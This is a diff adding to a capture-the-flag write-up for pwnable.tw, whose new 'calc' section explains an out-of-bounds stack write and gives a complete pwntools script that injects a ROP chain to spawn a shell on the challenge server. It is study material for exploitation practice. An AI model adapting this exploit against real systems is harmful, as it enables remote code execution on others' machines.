@@ -131,4 +131,49 @@ path is `/home/orw/flag`, 14 bytes.
 		... omitted...
 
 ## 03 CVE-2018-1160
+too hard for me...
 
+## 04 calc
+it's a buggy calculator. i spent a lot effort on reversing, and finally find a OOB(out of bound) write vulnerability, which allows user to write 4 bytes on stack. 
+This overwriting on stack performs in a infinete while loop, which makes control flow hijacking and ROPchian injection possible.
+
+after triggerring the OOB write so many times, ROPchain is injected to the stack, and then, overwrite the ret_addr to our beginning of chian.  A typical ROP attack is performed.
+```py
+#!/bin/python3
+
+from pwn import *
+
+# context.log_level = 'debug'
+
+# io = process('./calc')
+io = remote('chall.pwnable.tw', 10100)
+# gdb.attach(io, 'b*0x08049433\nc')
+
+def write_stack(offset, value):
+    payload = b''
+    payload += b'+'
+    payload += str(int(offset-1)).encode()
+    payload += b'+' + str(value).encode()
+    io.sendline(payload)
+    print(payload)
+    return
+
+io.recvuntil(b'calculator ===')
+offset = 361
+chain = b'\xaa\x01\x07\x08`\xc0\x0e\x08K\xc3\x05\x08/bin\r\xb3\t\x08\xaa\x01\x07\x08d\xc0\x0e\x08K\xc3\x05\x08//sh\r\xb3\t\x08\xaa\x01\x07\x08h\xc0\x0e\x08\xd0P\x05\x08\r\xb3\t\x08\xd1\x81\x04\x08`\xc0\x0e\x08\xd1\x01\x07\x08h\xc0\x0e\x08`\xc0\x0e\x08\xaa\x01\x07\x08h\xc0\x0e\x08\xd0P\x05\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08\x7f\xcb\x07\x08!\x9a\x04\x08'
+
+now = 0
+length = len(chain)
+times = length / 4
+#361~ 361+times-1
+offset = offset + times -1
+while(times>0):
+    write_stack(offset, u32(chain[-4:]))
+    offset = offset -1
+    chain = chain[:-4]
+    times = times-1
+
+io.sendline(b'')
+
+io.interactive()
+```
